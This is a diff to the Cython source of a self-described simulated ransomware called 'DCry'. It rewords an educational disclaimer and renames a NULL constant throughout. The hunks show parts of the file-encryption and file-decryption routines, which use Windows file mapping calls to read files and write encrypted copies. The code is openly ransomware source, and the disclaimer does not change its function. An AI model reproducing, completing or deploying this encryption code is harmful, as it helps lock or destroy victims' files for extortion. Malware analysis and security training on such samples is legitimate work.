@@ -4,9 +4,9 @@
 ################################################################################
 # DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
 # research, ethical hacking education, and malware analysis training only.
-# It mimics behavior of real ransomware but must NOT be used for illegal or 
-# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM) 
-# under supervision of cybersecurity professionals.
+# It mimics the behavior of real ransomware but must NOT be used for illegal or
+# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM)
+# under the supervision of cybersecurity professionals.
 # The authors assume no liability for any misuse or damage caused.
 
 import os
@@ -32,7 +32,7 @@ cdef extern from "windows.h":
     cdef DWORD OPEN_EXISTING
     cdef DWORD PAGE_READONLY
     cdef DWORD FILE_MAP_READ
-    cdef void* NULL
+    cdef void* NULL_
 
     HANDLE CreateFileA(char* lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, void* lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
     bint CloseHandle(HANDLE hObject)
@@ -54,13 +54,13 @@ def encrypt_file(str path, bytes key):
         bytes nonce_bytes, encrypted_chunk, tag
 
         HANDLE h_file = INVALID_HANDLE_VALUE
-        HANDLE h_map = NULL
-        char* mapped_view = NULL
+        HANDLE h_map = NULL_
+        char* mapped_view = NULL_
         LARGE_INTEGER file_size
         long long offset = 0
 
     try:
-        h_file = CreateFileA(path.encode('utf-8'), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL)
+        h_file = CreateFileA(path.encode('utf-8'), GENERIC_READ, 0, NULL_, OPEN_EXISTING, 0, NULL_)
         if h_file == INVALID_HANDLE_VALUE:
             return
 
@@ -70,12 +70,12 @@ def encrypt_file(str path, bytes key):
         if file_size.QuadPart == 0:
             return
 
-        h_map = CreateFileMappingA(h_file, NULL, PAGE_READONLY, 0, 0, NULL)
-        if h_map == NULL:
+        h_map = CreateFileMappingA(h_file, NULL_, PAGE_READONLY, 0, 0, NULL_)
+        if h_map == NULL_:
             return
 
         mapped_view = <char*>MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0)
-        if mapped_view == NULL:
+        if mapped_view == NULL_:
             return
 
         with open(encrypted_path, "wb") as f_out:
@@ -97,8 +97,8 @@ def encrypt_file(str path, bytes key):
         
         success = True
     finally:
-        if mapped_view != NULL: UnmapViewOfFile(mapped_view)
-        if h_map != NULL: CloseHandle(h_map)
+        if mapped_view != NULL_: UnmapViewOfFile(mapped_view)
+        if h_map != NULL_: CloseHandle(h_map)
         if h_file != INVALID_HANDLE_VALUE: CloseHandle(h_file)
         
         if success:
@@ -120,23 +120,23 @@ def decrypt_file(str path, bytes key):
         long long chunk_header_size = 12 + 16
 
         HANDLE h_file = INVALID_HANDLE_VALUE
-        HANDLE h_map = NULL
-        char* mapped_view = NULL
+        HANDLE h_map = NULL_
+        char* mapped_view = NULL_
         LARGE_INTEGER file_size
         long long offset = header_size
 
     try:
-        h_file = CreateFileA(path.encode('utf-8'), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL)
+        h_file = CreateFileA(path.encode('utf-8'), GENERIC_READ, 0, NULL_, OPEN_EXISTING, 0, NULL_)
         if h_file == INVALID_HANDLE_VALUE: return
 
         if not GetFileSizeEx(h_file, &file_size) or file_size.QuadPart < header_size:
             return
 
-        h_map = CreateFileMappingA(h_file, NULL, PAGE_READONLY, 0, 0, NULL)
-        if h_map == NULL: return
+        h_map = CreateFileMappingA(h_file, NULL_, PAGE_READONLY, 0, 0, NULL_)
+        if h_map == NULL_: return
 
         mapped_view = <char*>MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0)
-        if mapped_view == NULL: return
+        if mapped_view == NULL_: return
 
         if mapped_view[:len(MAGIC)] != MAGIC:
             return
@@ -163,8 +163,8 @@ def decrypt_file(str path, bytes key):
         
         success = True
     finally:
-        if mapped_view != NULL: UnmapViewOfFile(mapped_view)
-        if h_map != NULL: CloseHandle(h_map)
+        if mapped_view != NULL_: UnmapViewOfFile(mapped_view)
+        if h_map != NULL_: CloseHandle(h_map)
         if h_file != INVALID_HANDLE_VALUE: CloseHandle(h_file)
 
         if success:
